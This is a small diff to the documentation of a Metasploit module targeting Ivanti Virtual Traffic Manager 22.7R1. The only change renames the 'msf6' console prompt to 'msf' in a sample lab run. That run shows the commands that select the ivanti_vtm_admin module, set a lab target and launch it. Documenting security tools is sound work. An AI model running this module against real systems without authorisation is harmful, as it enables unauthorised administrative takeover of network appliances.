@@ -51,9 +51,9 @@ Running the module against Virtual Traffic Manager (vTM) 22.7R1 should result in
 similar to the following:
 
 ```
-msf6 > use auxiliary/admin/http/ivanti_vtm_admin 
-msf6 auxiliary(admin/http/ivanti_vtm_admin) > set RHOSTS 172.17.0.2
-msf6 auxiliary(admin/http/ivanti_vtm_admin) > exploit 
+msf > use auxiliary/admin/http/ivanti_vtm_admin 
+msf auxiliary(admin/http/ivanti_vtm_admin) > set RHOSTS 172.17.0.2
+msf auxiliary(admin/http/ivanti_vtm_admin) > exploit 
 [*] Running module against 172.17.0.2
 
 [*] Running automatic check ("set AutoCheck false" to disable)
